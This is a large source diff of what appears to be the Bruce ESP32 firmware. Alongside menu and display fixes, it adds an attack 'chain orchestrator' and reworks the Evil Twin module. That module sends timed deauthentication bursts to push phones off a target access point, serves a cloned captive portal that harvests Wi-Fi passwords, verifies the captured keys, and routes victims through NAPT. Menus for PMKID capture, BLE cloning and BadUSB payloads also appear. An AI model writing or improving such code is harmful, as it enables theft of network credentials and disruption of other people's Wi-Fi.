@@ -9755,7 +9755,6 @@ index 72d69eba..7fbd4ede 100644
      void addWebUISession(const String &token);
      void removeWebUISession(const String &token);
 diff --git a/src/core/display.cpp b/src/core/display.cpp
-index d3fe50ac..0b38b63d 100644
 --- a/src/core/display.cpp
 +++ b/src/core/display.cpp
 @@ -1,8 +1,11 @@
@@ -9778,7 +9777,7 @@ index d3fe50ac..0b38b63d 100644
  
  #if defined(HAS_TOUCH)
  static bool s_pageUpVisible = false, s_pageDownVisible = false;
-@@ -21,8 +25,16 @@ static int s_pageDownX = 0, s_pageDownY = 0, s_pageDownW = 0, s_pageDownH = 0;
+@@ -21,8 +25,16 @@ static int s_pageDownX = 0, s_pageDownY
  static int s_pageUpTargetIndex = 0, s_pageDownTargetIndex = 0;
  #endif
  
@@ -9832,7 +9831,7 @@ index d3fe50ac..0b38b63d 100644
      displayRedStripe(txt);
      Serial.println("ERR: " + txt);
  #ifdef USE_DUMMY_TFT
-@@ -355,6 +373,9 @@ void displayError(const String &txt, bool waitKeyPress) {
+@@ -355,6 +373,9 @@ void displayError(const String &txt, boo
  }
  
  void displayWarning(const String &txt, bool waitKeyPress) {
@@ -9842,7 +9841,7 @@ index d3fe50ac..0b38b63d 100644
      displayRedStripe(txt, TFT_BLACK, TFT_YELLOW);
      Serial.println("WARN: " + txt);
  #ifdef USE_DUMMY_TFT
-@@ -375,6 +396,9 @@ void displayInfo(const String &txt, bool waitKeyPress) {
+@@ -375,6 +396,9 @@ void displayInfo(const String &txt, bool
  }
  
  void displaySuccess(const String &txt, bool waitKeyPress) {
@@ -9927,17 +9926,26 @@ index d3fe50ac..0b38b63d 100644
                  check(PrevPress);
                  int prevEnabled = findNextEnabled(index, -1);
                  if (prevEnabled >= 0) index = prevEnabled;
-@@ -890,6 +949,9 @@ int loopOptions(
+@@ -890,7 +949,17 @@ int loopOptions(
              }
              if (chosen >= options.size() || !options[chosen].enabled) continue;
              Serial.println("Selected: " + String(options[chosen].label));
+-            options[chosen].operation();
 +#if defined(DSOLUTION_183_2MIC)
 +            uxSound(UiSound::Select);
 +#endif
-             options[chosen].operation();
++            // Copy the callback before running it. `options` is the shared global
++            // vector and the selected operation very often rewrites it (e.g.
++            // EvilPortal::setup() rebuilds it, target_atk_menu re-assigns it).
++            // Calling through options[chosen] would then invoke a std::function
++            // that was destroyed mid-call -- on the device that reads as "the
++            // menu just jumps back" or a reboot.
++            std::function<void()> chosenOp = options[chosen].operation;
++            chosenOp();
              break;
          }
-@@ -1022,12 +1084,26 @@ Opt_Coord drawOptions(
+         // interpreter_start -> running the interpreter
+@@ -1022,12 +1091,26 @@ Opt_Coord drawOptions(
      // drawStatusBar();
  
      tft.drawPixel(0, 0, bruceConfig.bgColor);
@@ -9964,7 +9972,7 @@ index d3fe50ac..0b38b63d 100644
      last_init = init;
      tft.setTextColor(fgcolor, bgcolor);
      tft.setTextSize(FM);
-@@ -1065,6 +1141,11 @@ Opt_Coord drawOptions(
+@@ -1065,6 +1148,11 @@ Opt_Coord drawOptions(
  #endif
  
      cont = 1;
@@ -9976,7 +9984,7 @@ index d3fe50ac..0b38b63d 100644
      for (i = 0; i < options.size(); i++) {
          if (i >= init) {
              int16_t cursorY = tft.getCursorY();
-@@ -1072,6 +1153,39 @@ Opt_Coord drawOptions(
+@@ -1072,6 +1160,39 @@ Opt_Coord drawOptions(
              options[i].y = cursorY;
              options[i].w = boxW;
              options[i].h = FM * LH + 4;
@@ -10016,7 +10024,7 @@ index d3fe50ac..0b38b63d 100644
              // Erase previously highlited element,
              if (i == last_index) {
                  tft.fillRoundRect(boxX + 2, cursorY + 2, boxW - 4, FM * LH + 2, 3, bruceConfig.bgColor);
-@@ -1107,6 +1221,7 @@ Opt_Coord drawOptions(
+@@ -1107,6 +1228,7 @@ Opt_Coord drawOptions(
  
              // Reset text color for next item
              tft.setTextColor(fgcolor, bgcolor);
@@ -10024,7 +10032,7 @@ index d3fe50ac..0b38b63d 100644
  
              cont++;
          }
-@@ -1129,9 +1244,23 @@ Opt_Coord drawOptions(
+@@ -1129,9 +1251,23 @@ Opt_Coord drawOptions(
      int rowsDrawnThisPage = menuSize + (showPageUp ? 1 : 0) + (showPageDown ? 1 : 0);
      for (int r = rowsDrawnThisPage; r < totalRows; r++) {
          int16_t cursorY = tft.getCursorY();
@@ -10049,7 +10057,7 @@ index d3fe50ac..0b38b63d 100644
      // update history
      last_index = index;
  #if defined(HAS_TOUCH)
-@@ -1152,6 +1281,137 @@ Opt_Coord drawOptions(
+@@ -1152,6 +1288,137 @@ Opt_Coord drawOptions(
  void drawSubmenu(int index, std::vector<Option> &options, const char *title) {
      drawStatusBar();
      int menuSize = options.size();
@@ -10187,7 +10195,7 @@ index d3fe50ac..0b38b63d 100644
      tft.setTextColor(bruceConfig.priColor, bruceConfig.bgColor);
      tft.setTextSize(FP);
      tft.drawPixel(0, 0, 0);
-@@ -1267,6 +1527,7 @@ void drawSubmenu(int index, std::vector<Option> &options, const char *title) {
+@@ -1267,6 +1534,7 @@ void drawSubmenu(int index, std::vector<
      );
      TouchFooter();
  #endif
@@ -10195,7 +10203,7 @@ index d3fe50ac..0b38b63d 100644
  }
  
  void drawStatusBar() {
-@@ -1274,20 +1535,27 @@ void drawStatusBar() {
+@@ -1274,20 +1542,27 @@ void drawStatusBar() {
      if (bat > 0) drawBatteryStatus(bat);
  
      if (bruceConfig.theme.border) {
@@ -10225,7 +10233,7 @@ index d3fe50ac..0b38b63d 100644
          );
      }
  
-@@ -1302,7 +1570,11 @@ void drawStatusBar() {
+@@ -1302,7 +1577,11 @@ void drawStatusBar() {
          tft.print(timeStr);
      } else {
          setTftDisplay(BORDER_PAD_X, BORDER_PAD_X, bruceConfig.priColor, FP, bruceConfig.bgColor);
@@ -27534,10 +27542,9 @@ index 00000000..819464cc
 +}
 diff --git a/src/modules/wifi/chain_orchestrator.cpp b/src/modules/wifi/chain_orchestrator.cpp
 new file mode 100644
-index 00000000..d5f26ade
 --- /dev/null
 +++ b/src/modules/wifi/chain_orchestrator.cpp
-@@ -0,0 +1,896 @@
+@@ -0,0 +1,938 @@
 +#include "chain_orchestrator.h"
 +#if !defined(LITE_VERSION)
 +
@@ -27686,6 +27693,31 @@ index 00000000..d5f26ade
 +        return false;
 +    }
 +    out = list[0]; // sorted by hits desc, then RSSI desc
++    return true;
++}
++
++// Explain *why* a tap did nothing instead of silently returning: the old menus
++// bounced straight back to the list with no message, which reads as "tap does
++// nothing" on the device.
++static void explainNoTarget(const char *what) {
++    displayWarning(
++        String("No ") + what + " yet.\nRun WiFi -> WiFi Atks -> Select target\n(or Scan & Analyze), then retry.",
++        true
++    );
++}
++
++// Evil Twin needs a target; asking here means the entry never dead-ends.
++static bool askEvilTwinTarget(String &outSsid, uint8_t &outCh) {
++    String s = keyboard("", 32, "Target SSID:");
++    if (s.isEmpty() || s == "\x1B") return false;
++    String chStr = keyboard(String(outCh), 3, "Channel 1-13:");
++    int ch = chStr.toInt();
++    if (ch < 1 || ch > 13) {
++        displayWarning("Channel must be 1-13. Using 6.", true);
++        ch = 6;
++    }
++    outSsid = s;
++    outCh = (uint8_t)ch;
 +    return true;
 +}
 +
@@ -27870,17 +27902,18 @@ index 00000000..d5f26ade
 +
 +static void reconCaptureMenu() {
 +    int choice = -1;
-+    options = {
-+        {"1. Probe Radar (observe)", [&]() { choice = 0; }},
-+        {"2. Analyzer (observe)", [&]() { choice = 1; }},
-+        {"3. Start PMKID (auto-target)", [&]() { choice = 2; }},
-+        {"4. Start CSA/PMF (auto-target)", [&]() { choice = 3; }},
-+        {"5. Auto-run: Probe+Analyzer+PMKID", [&]() { choice = 4; }},
-+        {"Stop capture", [&]() { choice = 5; }},
-+        {"Back", [&]() { choice = -1; }},
-+    };
-+    loopOptions(options, MENU_TYPE_SUBMENU, "Recon -> Capture");
-+    options.clear();
++    {
++        std::vector<Option> opts = {
++            {"1. Probe Radar (observe)", [&]() { choice = 0; }},
++            {"2. Analyzer (observe)", [&]() { choice = 1; }},
++            {"3. Start PMKID (auto-target)", [&]() { choice = 2; }},
++            {"4. Start CSA/PMF (auto-target)", [&]() { choice = 3; }},
++            {"5. Auto-run: Probe+Analyzer+PMKID", [&]() { choice = 4; }},
++            {"Stop capture", [&]() { choice = 5; }},
++            {"Back", [&]() { choice = -1; }},
++        };
++        loopOptions(opts, MENU_TYPE_SUBMENU, "Recon -> Capture");
++    }
 +    if (choice == 0) { probe_radar_setup(); return; }
 +    if (choice == 1) { channel_analyzer_setup(); return; }
 +    if (choice == 5) { pmkidStop(); csaStop(); displayInfo("Capture stopped", true); return; }
@@ -27923,13 +27956,14 @@ index 00000000..d5f26ade
 +static void naptLanMenu() {
 +    int choice = -1;
 +    String autoLbl = String("Auto-arm with NAPT: ") + (bruceConfig.seclabPlus.chainNaptLanAuto ? "ON" : "OFF");
-+    options = {
-+        {naptIsRunning() ? "NAPT [ON] - Stop LAN members" : "Start NAPT -> LAN", [&]() { choice = 0; }},
-+        {autoLbl, [&]() { choice = 1; }},
-+        {"Back", [&]() { choice = -1; }},
-+    };
-+    loopOptions(options, MENU_TYPE_SUBMENU, "NAPT -> LAN");
-+    options.clear();
++    {
++        std::vector<Option> opts = {
++            {naptIsRunning() ? "NAPT [ON] - Stop LAN members" : "Start NAPT -> LAN", [&]() { choice = 0; }},
++            {autoLbl, [&]() { choice = 1; }},
++            {"Back", [&]() { choice = -1; }},
++        };
++        loopOptions(opts, MENU_TYPE_SUBMENU, "NAPT -> LAN");
++    }
 +    if (choice == 1) {
 +        bruceConfig.seclabPlus.chainNaptLanAuto = !bruceConfig.seclabPlus.chainNaptLanAuto;
 +        bruceConfig.saveFile();
@@ -27948,13 +27982,14 @@ index 00000000..d5f26ade
 +static void portalLanMenu() {
 +    int choice = -1;
 +    String autoLbl = String("Auto-arm with Portal: ") + (bruceConfig.seclabPlus.chainPortalLanAuto ? "ON" : "OFF");
-+    options = {
-+        {portalNaptIsRunning() ? "Portal [ON] - Stop LAN members" : "Start Portal -> NAPT -> LAN", [&]() { choice = 0; }},
-+        {autoLbl, [&]() { choice = 1; }},
-+        {"Back", [&]() { choice = -1; }},
-+    };
-+    loopOptions(options, MENU_TYPE_SUBMENU, "Portal -> NAPT -> LAN");
-+    options.clear();
++    {
++        std::vector<Option> opts = {
++            {portalNaptIsRunning() ? "Portal [ON] - Stop LAN members" : "Start Portal -> NAPT -> LAN", [&]() { choice = 0; }},
++            {autoLbl, [&]() { choice = 1; }},
++            {"Back", [&]() { choice = -1; }},
++        };
++        loopOptions(opts, MENU_TYPE_SUBMENU, "Portal -> NAPT -> LAN");
++    }
 +    if (choice == 1) {
 +        bruceConfig.seclabPlus.chainPortalLanAuto = !bruceConfig.seclabPlus.chainPortalLanAuto;
 +        bruceConfig.saveFile();
@@ -27973,13 +28008,14 @@ index 00000000..d5f26ade
 +static void guardAuditMenu() {
 +    int choice = -1;
 +    String autoLbl = String("Auto-audit on alert: ") + (bruceConfig.seclabPlus.chainGuardAuditAuto ? "ON" : "OFF");
-+    options = {
-+        {lanGuardIsRunning() ? "Guard [ON] - Stop Guard+Audit" : "Start Guard -> Audit", [&]() { choice = 0; }},
-+        {autoLbl, [&]() { choice = 1; }},
-+        {"Back", [&]() { choice = -1; }},
-+    };
-+    loopOptions(options, MENU_TYPE_SUBMENU, "Guard -> Audit");
-+    options.clear();
++    {
++        std::vector<Option> opts = {
++            {lanGuardIsRunning() ? "Guard [ON] - Stop Guard+Audit" : "Start Guard -> Audit", [&]() { choice = 0; }},
++            {autoLbl, [&]() { choice = 1; }},
++            {"Back", [&]() { choice = -1; }},
++        };
++        loopOptions(opts, MENU_TYPE_SUBMENU, "Guard -> Audit");
++    }
 +    if (choice == 1) {
 +        bruceConfig.seclabPlus.chainGuardAuditAuto = !bruceConfig.seclabPlus.chainGuardAuditAuto;
 +        bruceConfig.saveFile();
@@ -28003,15 +28039,16 @@ index 00000000..d5f26ade
 +
 +static void blePipelineMenu() {
 +    int choice = -1;
-+    options = {
-+        {"1. Privacy Guard (observe)", [&]() { choice = 0; }},
-+        {"2. Pairing Audit (auto-target)", [&]() { choice = 1; }},
-+        {"3. GATT Explorer/Clone", [&]() { choice = 2; }},
-+        {"4. Auto-run: Guard+Audit+Explorer", [&]() { choice = 3; }},
-+        {"Back", [&]() { choice = -1; }},
-+    };
-+    loopOptions(options, MENU_TYPE_SUBMENU, "BLE Guard -> Audit -> Clone");
-+    options.clear();
++    {
++        std::vector<Option> opts = {
++            {"1. Privacy Guard (observe)", [&]() { choice = 0; }},
++            {"2. Pairing Audit (auto-target)", [&]() { choice = 1; }},
++            {"3. GATT Explorer/Clone", [&]() { choice = 2; }},
++            {"4. Auto-run: Guard+Audit+Explorer", [&]() { choice = 3; }},
++            {"Back", [&]() { choice = -1; }},
++        };
++        loopOptions(opts, MENU_TYPE_SUBMENU, "BLE Guard -> Audit -> Clone");
++    }
 +    if (choice == 0) { ble_guard_setup(); return; }
 +    if (choice == 2) { ble_gatt_cloner_setup(); return; }
 +    if (choice == 3) {
@@ -28041,13 +28078,14 @@ index 00000000..d5f26ade
 +    // Steps: 1) pick target AP, 2) Deauth (EvilPortal deauth loop), 3) Clone AP, 4) Verify password, 5) Route via real AP (NAPT)
 +    if (portalNaptIsRunning()) {
 +        int choice = -1;
-+        options = {
-+            {"Stop Evil Twin Route", [&]() { choice = 0; }},
-+            {"View Portal creds", [&]() { choice = 1; }},
-+            {"Back", [&]() { choice = -1; }},
-+        };
-+        loopOptions(options, MENU_TYPE_SUBMENU, "Evil Twin Route [ON]");
-+        options.clear();
++        {
++        std::vector<Option> opts = {
++                {"Stop Evil Twin Route", [&]() { choice = 0; }},
++                {"View Portal creds", [&]() { choice = 1; }},
++                {"Back", [&]() { choice = -1; }},
++            };
++            loopOptions(opts, MENU_TYPE_SUBMENU, "Evil Twin Route [ON]");
++    }
 +        if (choice == 0) { portalNaptStop(); displayInfo("Evil Twin stopped", true); return; }
 +        if (choice == 1) {
 +            // Show captured creds file if exists
@@ -28071,31 +28109,40 @@ index 00000000..d5f26ade
 +        targetCh = picked.channel;
 +    }
 +    int choice=-1;
-+    options = {
-+        {hasPick ? (String("Target: ") + targetSsid + " CH" + String(targetCh) + " (from scan)")
-+                 : String("Target: <run Scan & Analyze first>"), [&]() { choice = 0; }},
-+        {"Enter SSID manually", [&]() { choice=1; }},
-+        {String("Start Deauth+Clone+Verify+Route")+ (hasPick?"": " (need target)"), [&]() { choice=2; }},
-+        {"Back", [&]() { choice=-1; }},
-+    };
-+    loopOptions(options, MENU_TYPE_SUBMENU, "Deauth+Clone+Verify+Route");
-+    options.clear();
++    {
++        std::vector<Option> opts = {
++            {hasPick ? (String("Target: ") + targetSsid + " CH" + String(targetCh) + " (from scan)")
++                     : String("Target: none yet"), [&]() { choice = 0; }},
++            {"Enter SSID manually", [&]() { choice=1; }},
++            {"Start Deauth+Clone+Verify+Route", [&]() { choice=2; }},
++            {"Back", [&]() { choice=-1; }},
++        };
++        loopOptions(opts, MENU_TYPE_SUBMENU, "Deauth+Clone+Verify+Route");
++    }
 +    if (choice==0 && hasPick) {
-+        displayInfo(String("Selected: ")+targetSsid+" CH"+String(targetCh)+"\nPress Back then Start", true);
++        displayInfo(String(targetSsid)+" CH"+String(targetCh)+"\nTap Start to begin", true);
 +        return;
 +    }
 +    if (choice==1) {
-+        String s = keyboard(targetSsid, 32, "Target SSID:");
-+        if (s.length()>0 && s!="\x1B") { targetSsid=s; String chStr=keyboard(String(targetCh),3,"Channel 1-13:"); int ch=chStr.toInt(); if(ch>=1&&ch<=13) targetCh=(uint8_t)ch; hasPick=true;
-+            // Save as picked for next start
-+            picked = ChainTarget(); strncpy(picked.ssid, targetSsid.c_str(), sizeof(picked.ssid)-1); picked.channel=targetCh; hasPick=true;
-+        } else return;
-+        // recursive back to menu to allow start
-+        // For simplicity, directly start after manual entry
-+        choice=2;
++        if (!askEvilTwinTarget(targetSsid, targetCh)) return;
++        picked = ChainTarget();
++        strncpy(picked.ssid, targetSsid.c_str(), sizeof(picked.ssid) - 1);
++        picked.channel = targetCh;
++        hasPick = true;
++        choice = 2; // go straight to start with the target just entered
 +    }
 +    if (choice!=2) return;
-+    if (!hasPick) { displayWarning("No target. Run Scan & Analyze or enter SSID.", true); return; }
++    if (!hasPick) {
++        // Never dead-end: ask right here instead of bouncing back silently.
++        if (!askEvilTwinTarget(targetSsid, targetCh)) {
++            explainNoTarget("target");
++            return;
++        }
++        picked = ChainTarget();
++        strncpy(picked.ssid, targetSsid.c_str(), sizeof(picked.ssid) - 1);
++        picked.channel = targetCh;
++        hasPick = true;
++    }
 +    // Need uplink - try to use saved wifi or ask user to have connected once
 +    String uplinkSsid, uplinkPwd;
 +    // We will use portalNaptStartEvilTwin which handles fallback to verified creds
@@ -28115,16 +28162,17 @@ index 00000000..d5f26ade
 +
 +static void usbVerifyMenu() {
 +    int choice = -1;
-+    options = {
-+        {"1. Generate Payload", [&]() { choice = 0; }},
-+        {"2. Arm LED Receiver", [&]() { choice = 1; }},
-+        {"3. Run Payload (USB host)", [&]() { choice = 2; }},
-+        {"4. Check LED Result + Export", [&]() { choice = 3; }},
-+        {"5. Auto-run: Generate+Arm+Run", [&]() { choice = 4; }},
-+        {"Back", [&]() { choice = -1; }},
-+    };
-+    loopOptions(options, MENU_TYPE_SUBMENU, "USB Generate -> Verify");
-+    options.clear();
++    {
++        std::vector<Option> opts = {
++            {"1. Generate Payload", [&]() { choice = 0; }},
++            {"2. Arm LED Receiver", [&]() { choice = 1; }},
++            {"3. Run Payload (USB host)", [&]() { choice = 2; }},
++            {"4. Check LED Result + Export", [&]() { choice = 3; }},
++            {"5. Auto-run: Generate+Arm+Run", [&]() { choice = 4; }},
++            {"Back", [&]() { choice = -1; }},
++        };
++        loopOptions(opts, MENU_TYPE_SUBMENU, "USB Generate -> Verify");
++    }
 +    auto doGenerate = [&]() -> bool {
 +        String path, err;
 +        bool ok = smartBadUsbGeneratePayload(smartBadUsbGetOsProfile(),
@@ -28399,18 +28447,19 @@ index 00000000..d5f26ade
 +void chain_orchestrator_setup() {
 +    chainWatcherEnsure();
 +    int choice = -1;
-+    options = {
-+        {"Recon -> Capture", [&]() { choice = 0; }},
-+        {"NAPT -> LAN", [&]() { choice = 1; }},
-+        {"Portal -> NAPT -> LAN", [&]() { choice = 2; }},
-+        {"Guard -> Audit", [&]() { choice = 3; }},
-+        {"Deauth + Clone + Verify + Route", [&]() { choice = 4; }},
-+        {"BLE Guard -> Audit -> Clone", [&]() { choice = 5; }},
-+        {"USB Generate -> Verify", [&]() { choice = 6; }},
-+        {"Back", [&]() { choice = -1; }},
-+    };
-+    loopOptions(options, MENU_TYPE_SUBMENU, "Chains");
-+    options.clear();
++    {
++        std::vector<Option> opts = {
++            {"Recon -> Capture", [&]() { choice = 0; }},
++            {"NAPT -> LAN", [&]() { choice = 1; }},
++            {"Portal -> NAPT -> LAN", [&]() { choice = 2; }},
++            {"Guard -> Audit", [&]() { choice = 3; }},
++            {"Deauth + Clone + Verify + Route", [&]() { choice = 4; }},
++            {"BLE Guard -> Audit -> Clone", [&]() { choice = 5; }},
++            {"USB Generate -> Verify", [&]() { choice = 6; }},
++            {"Back", [&]() { choice = -1; }},
++        };
++        loopOptions(opts, MENU_TYPE_SUBMENU, "Chains");
++    }
 +    switch (choice) {
 +        case 0: reconCaptureMenu(); break;
 +        case 1: naptLanMenu(); break;
@@ -29097,7 +29146,6 @@ index 353b8641..006bee36 100644
  
  #endif
 diff --git a/src/modules/wifi/evil_portal.cpp b/src/modules/wifi/evil_portal.cpp
-index 59ed80ed..54194c21 100644
 --- a/src/modules/wifi/evil_portal.cpp
 +++ b/src/modules/wifi/evil_portal.cpp
 @@ -8,12 +8,34 @@
@@ -29135,10 +29183,15 @@ index 59ed80ed..54194c21 100644
  EvilPortal::EvilPortal(
      String tssid, uint8_t channel, bool deauth, bool verifyPwd, bool autoMode, bool backgroundMode,
      String templateFile
-@@ -26,6 +48,10 @@ EvilPortal::EvilPortal(
+@@ -26,6 +48,15 @@ EvilPortal::EvilPortal(
      _wifiWasConnected = WiFi.isConnected();
  
      if (!setup()) return;
++    // Every verify-enabled portal answers the form immediately and tests the
++    // key on the owner task (the blocking path made captive pages time out).
++    _asyncVerify = _verifyPwd;
++    _chainKick = !_backgroundMode && _deauth; // manual mode drives its own window
++    _lastKickMs = millis();
 +    if (!_staEventRegistered) {
 +        WiFi.onEvent(evilPortalStaEvent);
 +        _staEventRegistered = true;
@@ -29146,7 +29199,7 @@ index 59ed80ed..54194c21 100644
      cleanlyStopWebUiForWiFiFeature();
      beginAP();
      if (!_backgroundMode) { loop(); }
-@@ -67,6 +93,8 @@ bool EvilPortal::setup() {
+@@ -67,6 +98,8 @@ bool EvilPortal::setup() {
      if (_autoMode) {
          if (apName.isEmpty()) apName = "Free Wifi";
          if (!_autoTemplateFile.isEmpty() && loadCustomHtmlFromPath(_autoTemplateFile)) { return true; }
@@ -29155,7 +29208,7 @@ index 59ed80ed..54194c21 100644
          if (apName.indexOf("router") != -1 || apName.indexOf("update") != -1 ||
              apName.indexOf("firmware") != -1 || _verifyPwd) {
              loadDefaultHtml_one();
-@@ -142,30 +170,26 @@ void EvilPortal::beginAP() {
+@@ -142,30 +175,26 @@ void EvilPortal::beginAP() {
      while (millis() - tmp < 3000) yield();
  
      setupRoutes();
@@ -29195,7 +29248,7 @@ index 59ed80ed..54194c21 100644
      });
  
      webServer.on("/library/test/success.html", HTTP_GET, [this](AsyncWebServerRequest *request) {
-@@ -175,15 +199,11 @@ void EvilPortal::setupRoutes() {
+@@ -175,15 +204,11 @@ void EvilPortal::setupRoutes() {
      });
  
      webServer.on("/ncsi.txt", HTTP_GET, [this](AsyncWebServerRequest *request) {
@@ -29213,7 +29266,7 @@ index 59ed80ed..54194c21 100644
      });
  
      webServer.on("/redirect", HTTP_GET, [this](AsyncWebServerRequest *request) {
-@@ -211,15 +231,11 @@ void EvilPortal::setupRoutes() {
+@@ -211,15 +236,11 @@ void EvilPortal::setupRoutes() {
      });
  
      webServer.on("/detectportal.firefox.com/success.txt", HTTP_GET, [this](AsyncWebServerRequest *request) {
@@ -29231,7 +29284,7 @@ index 59ed80ed..54194c21 100644
      });
  
      webServer.on("/", [this](AsyncWebServerRequest *request) { portalController(request); });
-@@ -253,9 +269,7 @@ void EvilPortal::setupRoutes() {
+@@ -253,9 +274,7 @@ void EvilPortal::setupRoutes() {
              url.indexOf("ncsi") != -1 || url.indexOf("nmcheck") != -1 || url.indexOf("gnome") != -1 ||
              url.indexOf("ubuntu") != -1 || url.indexOf("canonical") != -1 ||
              url.indexOf("networkcheck") != -1 || url.indexOf("hotspot") != -1) {
@@ -29242,7 +29295,7 @@ index 59ed80ed..54194c21 100644
          } else if (request->args() > 0) {
              credsController(request);
          } else {
-@@ -267,6 +281,16 @@ void EvilPortal::setupRoutes() {
+@@ -267,6 +286,16 @@ void EvilPortal::setupRoutes() {
      webServer.addHandler(_captiveHandler).setFilter(ON_AP_FILTER);
  }
  
@@ -29259,7 +29312,7 @@ index 59ed80ed..54194c21 100644
  void EvilPortal::restartWiFi(bool reset) {
      webServer.end();
      dnsServer->stop();
-@@ -279,7 +303,7 @@ void EvilPortal::restartWiFi(bool reset) {
+@@ -279,7 +308,7 @@ void EvilPortal::restartWiFi(bool reset)
      vTaskDelay(100 / portTICK_PERIOD_MS);
  
      setupRoutes();
@@ -29268,7 +29321,7 @@ index 59ed80ed..54194c21 100644
      webServer.begin();
  
      if (reset) resetCapturedCredentials();
-@@ -295,6 +319,18 @@ void EvilPortal::loop() {
+@@ -295,6 +324,18 @@ void EvilPortal::loop() {
      bool exitPortal = false;
  
      while (true) {
@@ -29287,7 +29340,7 @@ index 59ed80ed..54194c21 100644
          if (_pendingWifiRestart) {
              _pendingWifiRestart = false;
              restartWiFi();
-@@ -308,9 +344,18 @@ void EvilPortal::loop() {
+@@ -308,9 +349,63 @@ void EvilPortal::loop() {
  
          dnsServer->processNextRequest();
  
@@ -29296,19 +29349,64 @@ index 59ed80ed..54194c21 100644
 +        // Deauth is a *windowed kick* driven by the chain (safety gates: never
 +        // while a victim is on our AP, never while verifying, never after
 +        // routing). This class only sends when explicitly told to.
-+        if (!isDeauthHeld && _deauth && _deauthPulseAt && millis() - _deauthPulseAt < 4000) {
++        if (!isDeauthHeld && _deauth && _deauthPulseAt) {
++            // One short burst per pulse (the chain rate-limits the pulses).
 +            for (uint8_t i = 0; i < 3; i++) {
 +                send_raw_frame(deauth_frame, 26);
 +                vTaskDelay(pdMS_TO_TICKS(2));
 +            }
              lastDeauthTime = millis();
 +            _deauthPulseAt = 0;
++        } else if (!isDeauthHeld && _deauth && _chainKick) {
++            // Manual mode (WiFi Atks -> target -> Deauth+Clone...): same bounded,
++            // backed-off kick window as the chain. The old version sent a burst
++            // every 250 ms forever, which makes phones blacklist the SSID and
++            // fall back to mobile data -- the "kicked off both networks" bug.
++            EvilTwinTiming kickTiming = evilTwinDefaultTiming();
++            uint32_t gap = evilTwinDeauthGapMs(kickTiming, _kickBursts ? (uint8_t)(_kickBursts - 1) : 0);
++            // Safety gate: once the victim is *our* client, every further deauth
++            // hits the clone itself and throws it back to mobile data. Stop here
++            // instead of firing the rest of the budget.
++            if (apClientCount() > 0) {
++                _deauth = false;
++                _lastKickMs = millis();
++            } else if (_kickBursts < kickTiming.maxBursts && millis() - _lastKickMs >= gap) {
++                for (uint8_t i = 0; i < 3; i++) {
++                    send_raw_frame(deauth_frame, 26);
++                    vTaskDelay(pdMS_TO_TICKS(2));
++                }
++                _lastKickMs = millis();
++                _kickBursts++;
++                lastDeauthTime = millis();
++            }
 +        } else if (!_deauth) {
 +            _deauthPulseAt = 0;
++        }
++
++        // Verification off the HTTP task (manual "Deauth+Clone+Verify"):
++        // answering the form immediately is what keeps Android from tearing the
++        // association down while the handshake test is still running.
++        {
++            String vSsid, vPwd;
++            if (takePendingCredentials(vSsid, vPwd)) {
++                int vReason = 0;
++                bool vOk = verifyCredentialsLocked(vSsid, vPwd, _channel, nullptr, &vReason);
++                notifyVerifyResult(vOk);
++                EvilTwinVerifyResult vr = evilTwinClassifyVerify(vOk, vReason);
++                lastCred = String("verify: ") + evilTwinVerifyResultName(vr) + "\n";
++                shouldRedraw = true;
++                // Wrong key on the manual path: a phone that gave up and fell
++                // back to mobile data is pulled in again with whatever is left
++                // of the bounded budget. Never a fresh unlimited flood.
++                if (!vOk && _chainKick && apClientCount() == 0) {
++                    EvilTwinTiming t = evilTwinDefaultTiming();
++                    if (_kickBursts < t.maxBursts) _deauth = true;
++                }
++            }
          }
  
          if (totalCapturedCredentials != (previousTotalCapturedCredentials + 1)) {
-@@ -373,11 +418,13 @@ void EvilPortal::loop() {
+@@ -373,11 +468,13 @@ void EvilPortal::loop() {
  
  void EvilPortal::processRequests() {
      if (!_backgroundMode) return;
@@ -29323,7 +29421,7 @@ index 59ed80ed..54194c21 100644
      if (totalCapturedCredentials != (previousTotalCapturedCredentials + 1)) {
          previousTotalCapturedCredentials = totalCapturedCredentials - 1;
      }
-@@ -484,8 +531,10 @@ void EvilPortal::printLastCapturedCredential() {
+@@ -484,8 +581,10 @@ void EvilPortal::printLastCapturedCreden
  }
  
  void EvilPortal::printDeauthStatus() {
@@ -29336,7 +29434,7 @@ index 59ed80ed..54194c21 100644
      } else {
          tft.setTextColor(TFT_RED);
          printFootnote("Deauth ON");
-@@ -514,6 +563,40 @@ void EvilPortal::loadCustomHtml() {
+@@ -514,6 +613,40 @@ void EvilPortal::loadCustomHtml() {
      }
  }
  
@@ -29377,7 +29475,7 @@ index 59ed80ed..54194c21 100644
  bool EvilPortal::loadCustomHtmlFromPath(const String &path) {
      if (path.isEmpty()) return false;
      if (!getFsStorage(fsHtmlFile) || !fsHtmlFile->exists(path)) return false;
-@@ -714,15 +797,30 @@ void EvilPortal::credsController(AsyncWebServerRequest *request) {
+@@ -714,15 +847,30 @@ void EvilPortal::credsController(AsyncWe
      htmlResponse += "</li>\n";
  
      if (_verifyPwd && passwordValue != "") {
@@ -29411,7 +29509,7 @@ index 59ed80ed..54194c21 100644
              vTaskDelay(50 / portTICK_PERIOD_MS);
              verifyPass = true;
              _deauth = false;
-@@ -738,6 +836,181 @@ void EvilPortal::credsController(AsyncWebServerRequest *request) {
+@@ -738,6 +886,181 @@ void EvilPortal::credsController(AsyncWe
  
      capturedCredentialsHtml = htmlResponse + capturedCredentialsHtml;
      totalCapturedCredentials++;
@@ -29594,7 +29692,6 @@ index 59ed80ed..54194c21 100644
  
  String EvilPortal::getHtmlTemplate(const String &body) {
 diff --git a/src/modules/wifi/evil_portal.h b/src/modules/wifi/evil_portal.h
-index 4a8b438e..de9d8f5b 100644
 --- a/src/modules/wifi/evil_portal.h
 +++ b/src/modules/wifi/evil_portal.h
 @@ -6,6 +6,10 @@
@@ -29666,7 +29763,7 @@ index 4a8b438e..de9d8f5b 100644
  
      DNSServer &getDNSServer() { return *dnsServer; }
      AsyncWebServer &getWebServer() { return webServer; }
-@@ -79,7 +131,21 @@ private:
+@@ -79,7 +131,24 @@ private:
      int previousTotalCapturedCredentials = -1;
      String capturedCredentialsHtml = "";
      bool verifyPass = false;
@@ -29683,12 +29780,15 @@ index 4a8b438e..de9d8f5b 100644
 +    String _pendingCredPwd;
 +    volatile bool _internetUp = false;
 +    volatile uint32_t _deauthPulseAt = 0;
++    bool _chainKick = false;   // manual mode: bounded kick window owned here
++    uint8_t _kickBursts = 0;
++    uint32_t _lastKickMs = 0;
 +    volatile bool dnsRunning = false;
 +    static inline bool _staEventRegistered = false;
  
      CaptiveRequestHandler *_captiveHandler = nullptr;
  
-@@ -94,6 +160,11 @@ private:
